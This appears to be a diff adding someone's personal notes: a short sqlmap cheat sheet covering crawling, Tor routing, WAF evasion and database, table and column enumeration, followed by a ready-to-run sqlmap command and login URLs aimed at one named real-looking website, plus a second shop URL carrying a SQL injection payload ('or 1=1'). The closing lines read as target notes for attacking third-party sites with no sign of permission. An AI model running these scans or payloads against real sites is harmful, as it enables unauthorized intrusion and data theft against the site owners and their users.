@@ -1,0 +1,46 @@
+
+sqlmap -h		help 
+
+sqlmap -hh		verbose help
+
+sqlmap -u URL*	Append an asterisk (*) to URL Paths 
+
+sqlmap --url URL	test GET parameter 
+
+sqlmap --url URL -tor	Scanning through tor network
+
+sqlmap -u URL?id=1 -p id  -p: parameter to scan for
+
+sqlmap -u URL –crawl=[1,2,3,4,5,6,7,8,9,10] –batch	use crawler AND values will be bypassed and the sqlmap enters default values ( Y/N ) 
+
+sqlmap -u URL –risk=[1,2,3]	allows users to see payloads
+
+sqlmap -u URL –threads=[1,2,3,4,5]	 increase the scan speed or decrease the scan speed
+
+sqlmap -u URL --random-agent 	bypass Web Application Firewall - WAF
+
+sqlmap -u URL — dbs		 enumerate the list of databases
+
+sqlmap -u URL  --tables 		Retrieve the Database Tables
+
+sqlmap -u URL  --columns		enumerate columns
+
+python sqlmap.py --data "username=xyz&password=xyz&submit=xyz" -u URL 	Test POST Parameters
+
+sqlmap -u URL --forms	parse all forms in a webpage and automatically test them
+
+sqlmap -u URL  --level=[1,2,3,4,5]  default being level 1. Level 2 adds HTTP Cookie header testing, level 3 adds HTTP User-Agent/Referer headers.
+
+
+
+
+python sqlmap.py   --random-agent  --level=1   --crawl=1    --batch --threads=4  -u https://www.emuasa.es/en/login?p_p_id=  -p p_p_id
+
+
+https://www.emuasa.es/en/login?p_p_id=
+
+https://www.emuasa.es/en/login?p_p_id=CustomLoginPortlet&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&_CustomLoginPortlet_javax.portlet.action=%2Flogin%2Flogin&_CustomLoginPortlet_mvcRenderCommandName=%2Flogin%2Flogin
+
+https://tienda.ielab.es/
+
+https://tienda.ielab.es/search?q=';+or+1=1;#--&sid=true&advs=true
